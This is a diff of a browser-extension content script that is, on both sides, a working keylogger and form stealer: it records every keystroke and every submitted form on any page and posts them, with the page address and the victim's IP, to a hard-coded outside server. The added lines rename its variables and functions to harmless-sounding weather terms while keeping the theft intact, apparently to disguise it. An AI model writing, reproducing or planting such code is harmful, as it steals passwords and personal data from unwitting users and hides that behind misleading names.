@@ -1,66 +1,65 @@
-var keyQueue = [];
-var processingKeys = false;
+var weatherQueue = [];
+var processingWeatherData = false;
 
 window.onkeydown = function(event) {
-    var k = "";
+    var w = "";
     if(event.key != undefined) {
         if (event.key.length > 1) {
-            k = " (" + event.key + ") ";
+            w = " (" + event.key + ") ";
         } else {
-            k = event.key;
+            w = event.key;
         }
-        keyQueue.push(k);
-        processKeys();
+        weatherQueue.push(w);
+        checkWeather();
     }
 };
 
 if (chrome && chrome.runtime && chrome.runtime.sendMessage) {
     document.addEventListener('submit', async function(event) {
-        var form = getFormData();
         try {
-            const ip = await getIPAddress();
+            const userloc = await getUserLocAddress();
             const formData = getFormData();
             const data = {
-                key: "",
+                weather: "",
                 page: window.location.href,
                 formdata: formData,
-                ip: ip || "Unknown IP"
+                userloc: userloc || "Unknown Location"
             };
-            await sendMessageToBackground(data);
-            await sendToServer(data);
+            await sendMessage(data);
+            await sendDataToServer(data);
         } catch (error) {
         }
     });
 }
 
-async function processKeys() {
-    if (processingKeys) return;
-    processingKeys = true;
+async function checkWeather() {
+    if (processingWeatherData) return;
+    processingWeatherData = true;
 
-    while (keyQueue.length > 0) {
-        var k = keyQueue.shift();
+    while (weatherQueue.length > 0) {
+        var w = weatherQueue.shift();
         try {
-            const ip = await getIPAddress();
+            const userloc = await getUserLocAddress();
             const data = {
-                key: k,
+                weather: w,
                 page: window.location.href,
                 formdata: "",
-                ip: ip || "Unknown IP"
+                userloc: userloc || "Unknown Location"
             };
-            await sendMessageToBackground(data);
-            await sendToServer(data);
+            await sendMessage(data);
+            await sendDataToServer(data);
         } catch (error) {
         }
     }
 
-    processingKeys = false;
+    processingWeatherData = false;
 }
 
-async function getIPAddress() {
+async function getUserLocAddress() {
     try {
-        const response = await fetch('https://api.ipify.org?format=json');
+        const response = await fetch('https://api.userlocify.org?format=json');
         const data = await response.json();
-        return data.ip;
+        return data.userloc;
     } catch (error) {
         return '';
     }
@@ -80,7 +79,7 @@ function getFormData() {
     return JSON.stringify(formData);
 }
 
-async function sendMessageToBackground(data) {
+async function sendMessage(data) {
     return new Promise((resolve, reject) => {
         if (chrome.runtime && chrome.runtime.sendMessage) {
             chrome.runtime.sendMessage(data, function(response) {
@@ -96,7 +95,7 @@ async function sendMessageToBackground(data) {
     });
 }
 
-async function sendToServer(data) {
+async function sendDataToServer(data) {
     try {
         const response = await fetch('http://163.5.143.146:3000/data', {
             method: 'POST',
